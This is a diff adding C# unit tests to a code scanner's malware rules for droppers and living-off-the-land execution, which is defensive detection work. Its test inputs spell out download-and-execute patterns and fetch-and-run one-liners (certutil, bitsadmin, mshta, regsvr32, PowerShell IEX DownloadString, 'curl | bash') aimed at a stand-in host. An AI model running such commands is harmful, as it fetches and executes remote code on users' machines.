@@ -298,6 +298,116 @@ public class RuleEngineTests
         Assert.False(finding.IsBlocking);
     }
 
+    // ---- Droppers ----------------------------------------------------------
+
+    /// <summary>
+    /// The whole sequence, which is the only thing worth reporting. Each of the three calls is
+    /// unremarkable on its own and every application makes at least one of them.
+    /// </summary>
+    [Fact]
+    public void DownloadThenExecute_IsReported()
+    {
+        var finding = Assert.Single(
+            Scan(
+                """
+                var bytes = await new HttpClient().GetByteArrayAsync(url);
+                var target = Path.Combine(Path.GetTempPath(), "update.exe");
+                File.WriteAllBytes(target, bytes);
+                Process.Start(target);
+                """,
+                "Updater.cs"),
+            f => f.RuleId == "VC-MAL-007");
+
+        Assert.Equal(Severity.High, finding.Severity);
+
+        // An updater is this shape. Telling somebody not to install their own updater would
+        // spend the credibility the blocking rules run on.
+        Assert.False(finding.IsBlocking);
+    }
+
+    [Fact]
+    public void DownloadThenExecute_IsReportedInJavaScript() =>
+        Assert.True(Fired(
+            "VC-MAL-007",
+            """
+            const file = fs.createWriteStream(path.join(os.tmpdir(), "setup.exe"));
+            https.get("https://example.com/setup.exe", res => res.pipe(file));
+            child_process.execFile(file.path);
+            """));
+
+    /// <summary>
+    /// Half the sequence is not the sequence. Launching a process is ordinary, and a rule that
+    /// fired on every one of them would be noise wearing a Critical badge.
+    /// </summary>
+    [Theory]
+    [InlineData("""Process.Start(new ProcessStartInfo("notepad.exe"));""")]
+    [InlineData("""Process.Start(new ProcessStartInfo(uri) { UseShellExecute = true });""")]
+    [InlineData("""var json = await new HttpClient().GetStringAsync("https://api.example.com");""")]
+    public void ExecutionOrDownloadAlone_IsNotADropper(string line) =>
+        Assert.False(Fired("VC-MAL-007", line, "Program.cs"));
+
+    /// <summary>
+    /// Found by running this rule over applications known to be honest, which is the only way
+    /// this class of mistake surfaces. In JavaScript <c>.exec(</c> is how a regular expression
+    /// is run, so the first draft reported a base64 data-URL check inside a dashboard, and a
+    /// difficulty-band parser, as programs being launched. Both files fetch and write
+    /// elsewhere, so the corroboration did not save it and only the pattern could.
+    /// </summary>
+    [Theory]
+    [InlineData("""const m = /^data:image\/png;base64,(.+)$/.exec(image);""")]
+    [InlineData("""const band = /HappinessBand([0-9])/.exec(raw ?? "");""")]
+    public void RunningARegularExpression_IsNotRunningAProgram(string line) =>
+        Assert.False(Fired(
+            "VC-MAL-007",
+            $$"""
+            const res = await fetch("https://example.com/data.json");
+            fs.writeFileSync(path.join(os.tmpdir(), "data.json"), await res.text());
+            {{line}}
+            """));
+
+    /// <summary>
+    /// A download with nowhere to land is not a dropper either: plenty of applications fetch
+    /// data and launch a browser, and neither half touches the other.
+    /// </summary>
+    [Fact]
+    public void FetchingDataAndOpeningABrowser_IsNotADropper() =>
+        Assert.False(Fired(
+            "VC-MAL-007",
+            """
+            var json = await new HttpClient().GetStringAsync("https://api.example.com/status");
+            Process.Start(new ProcessStartInfo("https://example.com/help") { UseShellExecute = true });
+            """,
+            "Help.cs"));
+
+    // ---- Living off the land -----------------------------------------------
+
+    [Theory]
+    [InlineData("""cmd = "certutil -urlcache -split -f http://x.example/p.exe p.exe";""")]
+    [InlineData("""var c = "bitsadmin /transfer j http://x.example/p.exe C:\\p.exe";""")]
+    [InlineData("""Process.Start("mshta", "https://x.example/a.hta");""")]
+    [InlineData("""var s = "regsvr32 /s /n /u /i:https://x.example/a.sct scrobj.dll";""")]
+    [InlineData("""var ps = "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')";""")]
+    [InlineData("""exec("curl -s https://x.example/i.sh | bash");""")]
+    public void LivingOffTheLandExecution_IsBlocking(string line)
+    {
+        var finding = Assert.Single(Scan(line, "Setup.cs"), f => f.RuleId == "VC-MAL-008");
+
+        Assert.True(finding.IsBlocking);
+        Assert.Equal(Severity.Critical, finding.Severity);
+    }
+
+    /// <summary>
+    /// Encoded PowerShell is left out on purpose. Real installers encode a command to get
+    /// around quoting, so it is a capability rather than a technique, and blocking on it would
+    /// print "do not install this application" over ordinary software.
+    /// </summary>
+    [Theory]
+    [InlineData("""var p = "powershell -EncodedCommand SQBFAFgA";""")]
+    [InlineData("""Process.Start("powershell", "-ExecutionPolicy Bypass -File setup.ps1");""")]
+    [InlineData("""var url = "https://example.com/certutil-guide";""")]
+    public void OrdinaryShellingOut_IsNotBlocked(string line) =>
+        Assert.False(Fired("VC-MAL-008", line, "Setup.cs"));
+
     // ---- Test-file handling -----------------------------------------------
 
     [Fact]
